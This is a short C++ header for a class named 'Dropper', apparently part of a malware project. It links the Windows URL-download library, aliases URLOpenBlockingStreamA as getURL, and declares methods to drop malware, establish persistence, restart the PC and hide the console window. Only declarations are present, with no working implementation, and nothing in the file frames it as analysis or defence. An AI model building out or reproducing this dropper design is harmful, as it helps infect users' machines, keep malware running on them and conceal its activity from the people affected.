#include "Includes.h"
#include "Config.h"

#pragma once
#pragma comment(lib, "Urlmon.lib")
#define getURL URLOpenBlockingStreamA

//////////////////////////////////
//			Dropper 			//
//////////////////////////////////
class Dropper
{
public:

	void Init(Config config);
	void DropMalware();
	void Persistence();
	void RestartPC();
	void HideConsoleWD();
	void ShowConsoleWD();
};
